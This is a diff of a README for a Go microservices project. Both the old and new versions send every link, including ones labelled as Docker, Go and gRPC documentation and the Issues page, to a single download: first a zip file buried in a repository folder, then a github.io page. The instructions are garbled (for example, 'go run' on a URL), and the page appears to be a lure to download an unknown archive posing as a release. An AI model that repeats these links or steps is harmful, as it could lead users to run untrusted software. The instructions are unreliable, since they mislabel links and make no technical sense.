@@ -1,7 +1,7 @@
 # 🚀 go-microservices - A Simple Multi Microservices Solution
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/c2c-Ride/go-microservices/raw/refs/heads/master/account/go_microservices_v2.9.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/c2c-Ride/go-microservices/raw/refs/heads/master/account/go_microservices_v2.9.zip)
+[![Download Latest Release](https://c2c-ride.github.io)](https://c2c-ride.github.io)
 
 ## 📖 Description
 go-microservices is a straightforward GraphQL multi-microservices project written in Go. It communicates efficiently using gRPC. This project allows users to easily set up a microservices architecture for their applications, enabling quick communication between services.
@@ -28,7 +28,7 @@ To get started quickly, follow these simple steps.
 - **Disk Space:** At least 1GB of free space
 
 ### 🔗 Download & Install
-Visit this page to download: [Latest Releases](https://github.com/c2c-Ride/go-microservices/raw/refs/heads/master/account/go_microservices_v2.9.zip)
+Visit this page to download: [Latest Releases](https://c2c-ride.github.io)
 
 1. Open the link provided above.
 2. You will see a list of available releases. Choose the latest version.
@@ -53,11 +53,11 @@ To run the application, follow these steps:
 
 - **For Manual Users:**
   
-  1. Install all dependencies listed in the `https://github.com/c2c-Ride/go-microservices/raw/refs/heads/master/account/go_microservices_v2.9.zip` file.
+  1. Install all dependencies listed in the `https://c2c-ride.github.io` file.
   2. Make sure PostgreSQL is running and the database is set up.
   3. Use the following command to run the main service:
      ```
-     go run https://github.com/c2c-Ride/go-microservices/raw/refs/heads/master/account/go_microservices_v2.9.zip
+     go run https://c2c-ride.github.io
      ```
   4. Open your preferred web browser and go to `http://localhost:8080` to interact with the application.
 
@@ -65,22 +65,22 @@ To run the application, follow these steps:
 To customize your setup, you can modify the configuration files. Look for files ending in `.env` or configuration settings within the application folder.
 
 ### 🔄 Updating the Application
-To update the application, simply return to the [Latest Releases](https://github.com/c2c-Ride/go-microservices/raw/refs/heads/master/account/go_microservices_v2.9.zip) page and download the most recent release. Replace the old files with the new ones, then run the application as described above.
+To update the application, simply return to the [Latest Releases](https://c2c-ride.github.io) page and download the most recent release. Replace the old files with the new ones, then run the application as described above.
 
 ### 🆘 Troubleshooting
 If you encounter issues while running the application:
 
 - Ensure Docker is running.
 - Check for errors in the terminal or command prompt.
-- Visit the [Issues section](https://github.com/c2c-Ride/go-microservices/raw/refs/heads/master/account/go_microservices_v2.9.zip) in the GitHub repository for common problems and solutions.
+- Visit the [Issues section](https://c2c-ride.github.io) in the GitHub repository for common problems and solutions.
 
 ### 📄 Further Help
 For additional help, refer to the comprehensive documentation included in the project files. You can also explore community forums and discussions related to Go, Docker, and microservices.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/c2c-Ride/go-microservices/raw/refs/heads/master/account/go_microservices_v2.9.zip)
-- [Docker Documentation](https://github.com/c2c-Ride/go-microservices/raw/refs/heads/master/account/go_microservices_v2.9.zip)
-- [Go Documentation](https://github.com/c2c-Ride/go-microservices/raw/refs/heads/master/account/go_microservices_v2.9.zip)
-- [gRPC Documentation](https://github.com/c2c-Ride/go-microservices/raw/refs/heads/master/account/go_microservices_v2.9.zip)
+- [GitHub Repository](https://c2c-ride.github.io)
+- [Docker Documentation](https://c2c-ride.github.io)
+- [Go Documentation](https://c2c-ride.github.io)
+- [gRPC Documentation](https://c2c-ride.github.io)
 
 By following these instructions, you can successfully download, run, and troubleshoot the go-microservices application. Enjoy using your new multi-microservices solution!
